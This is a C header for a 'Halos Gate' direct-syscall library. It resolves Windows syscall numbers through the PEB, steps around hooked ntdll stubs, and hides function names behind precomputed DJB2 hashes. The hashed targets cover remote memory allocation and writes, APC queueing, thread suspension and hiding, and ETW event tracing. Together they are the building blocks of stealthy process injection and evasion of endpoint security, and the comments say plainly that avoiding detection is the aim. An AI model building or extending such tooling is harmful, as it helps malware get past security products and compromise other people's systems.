/*
 * halos.h — Halos Gate: evolved Hell's Gate with hook detection
 */

#ifndef HALOS_H
#define HALOS_H

#include <windows.h>

/* SSN sentinel — no real syscall has this number */
#define SSN_INVALID 0xFFFFFFFF

/* Resolve SSN for a syscall function via PEB + Halos Gate.
 * Handles hooked ntdll stubs by walking neighbors.
 * Returns SSN or SSN_INVALID on failure. */
DWORD halos_get_ssn(const char *func_name);

/* Resolve SSN via a precomputed DJB2 name hash — no string needed.
 * Lets callers pass a compile-time hash constant (see HASH_* defines
 * below) so the function name never appears in .rdata.
 * Returns SSN or SSN_INVALID on failure. */
DWORD halos_get_ssn_hash(DWORD name_hash);

/* ---- DJB2 hashes of syscall/function names (computed offline) ----
 * These let callers pass a compile-time constant instead of a string,
 * so no sensitive function name ever appears in the binary.
 * Algorithm: h = 5381; for each byte c: h = (h<<5)+h+c  (mod 2^32) */
#define HASH_NtAllocateVirtualMemory   0x6793C34C
#define HASH_NtWriteVirtualMemory      0x95F3A792
#define HASH_NtReadVirtualMemory       0xC24062E3
#define HASH_NtProtectVirtualMemory    0x082962C8
#define HASH_NtQueueApcThread          0xD4612238
#define HASH_NtQueueApcThreadEx        0x71329995
#define HASH_NtSuspendThread           0x50FEBD61
#define HASH_NtResumeThread            0x2C7B3D30
#define HASH_NtFreeVirtualMemory       0x471AA7E9
#define HASH_NtQueryInformationProcess  0xD034FC62
#define HASH_NtSetInformationThread     0x54212E31
#define HASH_EtwEventWrite             0x24A8D022
#define HASH_NtTraceEvent               0x1E2085F8

/* Create a syscall stub in RW→RX memory (no VirtualAlloc).
 * Returns pointer to executable stub, or NULL on failure.
 * Caller must free with halos_free_stub(). */
LPVOID halos_create_stub(DWORD ssn);

/* Zero and free a syscall stub via direct syscall (no VirtualFree). */
void halos_free_stub(LPVOID stub);

/* F4/F15: per-SSN direct-syscall stubs cached in one RX page.
 * halos_invoke executes the syscall `ssn` with the 6 register-passed
 * arguments (rcx,rdx,r8,r9,stack[0],stack[1] -> the NTAPI convention)
 * through a cached slot whose imm32 holds the baked SSN. No per-call
 * stack execution, no per-call RW→RX flip, no shared RW SSN cell.
 * Returns the NTSTATUS. */
LONG halos_invoke(DWORD ssn, void *a1, void *a2, void *a3,
                  void *a4, void *a5, void *a6);

/* Resolve (lazily) the SSN for a hash and invoke it in one call.
 * Convenience wrapper: returns SSN_INVALID as NTSTATUS on failure. */
LONG halos_invoke_hash(DWORD name_hash, void *a1, void *a2, void *a3,
                       void *a4, void *a5, void *a6);

/* One-time setup of the persistent invoke trampoline. Safe to call
 * multiple times (idempotent). Call early, before any halos_invoke. */
void halos_init(void);

/* Typedefs for syscall function pointers */
typedef LONG NTSTATUS;

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(
    HANDLE ThreadHandle, PVOID ApcRoutine,
    PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
    HANDLE ProcessHandle, ULONG InfoClass,
    PVOID ProcessInformation, ULONG Length, PULONG ReturnLength);

typedef NTSTATUS (NTAPI *NtSetInformationThread_t)(
    HANDLE ThreadHandle, ULONG InfoClass,
    PVOID ThreadInformation, ULONG ThreadInformationLength);

#endif /* HALOS_H */